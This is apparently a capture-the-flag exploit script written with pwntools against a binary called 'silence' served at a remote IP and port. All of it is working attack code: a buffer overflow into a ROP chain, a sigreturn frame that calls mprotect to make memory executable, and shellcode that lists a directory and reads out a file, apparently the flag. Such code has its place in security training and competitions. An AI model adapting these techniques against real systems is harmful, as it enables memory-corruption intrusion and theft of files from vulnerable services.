#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./silence', checksec=False)
context.log_level = 'debug'

if args.LOCAL:
	p = process(exe.path)
else:
	p = remote('192.81.209.60', 2023)

mov_eax_0 = 0x401255
pop_rsi_r15 = 0x00000000004012c1
pop_rdi = 0x00000000004012c3
syscall = 0x000000000040119e
rw_section = 0x404900    # Storing shellcode

##################################################
### Stage 1: Input sigreturn frame + shellcode ###
##################################################
payload = b'A'*(24-8)
payload += flat(
	# First read for shellcode + SigreturnFrame
	rw_section-8,        # Saved rbp for 'leave'
	pop_rdi, 0,
	pop_rsi_r15, rw_section, 0,
	syscall,

	# Reset rax = 0, prepare for second read
	mov_eax_0,
	)
p.sendafter(b':xD\n', payload)

# Sigreturn to execute mprotect
frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = 0x404000
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = 0x00000000404a20
frame.rip = syscall      # mprotect syscall

# After mprotect, jump to shellcode
shellcode = asm(
	'''
	mov rax, 435459876204
	push rax
	mov rax, 7598469108978378799
	push rax

	mov rax, 2
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall

	sub rsp, 0x500
	mov rdi, rax
	mov rax, 0x4e
	mov rsi, rsp
	mov rdx, 0x500
	syscall
	''', arch='amd64')
# Add this code to print all file names
# shellcode += asm(
# 	'''
# 	mov rax, 1
# 	add rsi, 162
# 	xor rdi, rdi
# 	syscall
# 	''', arch='amd64')
shellcode += asm(
	'''
	add rsp, 162
	mov rdx, 3415245218229545331
	push rdx
	mov rdx, 3415256217687097344
	push rdx

	mov rdi, rsp
	add rdi, 3
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 2
	syscall

	mov rdi, rax
	mov rsi, rsp
	mov rdx, 0x100
	xor rax, rax
	syscall

	mov rax, 1
	xor rdi, rdi
	syscall
	''', arch='amd64')

# Make it read again to get rax = 0xf
payload = flat(
	# Second read to set rax = 0xf
	pop_rsi_r15, rw_section-0x500, 0,    # tmp
	syscall,              # Set rax = 0xf
	syscall,              # Sigreturn syscall
	bytes(frame),

	0x404b01,             # Jump to shellcode
	0xdeadbeef
	)
payload = payload.ljust(0x201, b'\x00')
payload += shellcode

input('Temp 1: Input shellcode + SigreturnFrame')
p.send(payload)

###############################################
### Stage 2: Execute sigframe and shellcode ###
###############################################
input('Temp 2: Set rax = 0xf')
p.send(b'A'*0xf)

if args.LOCAL:
	pass
else:
	print(p.recvall())

p.interactive()
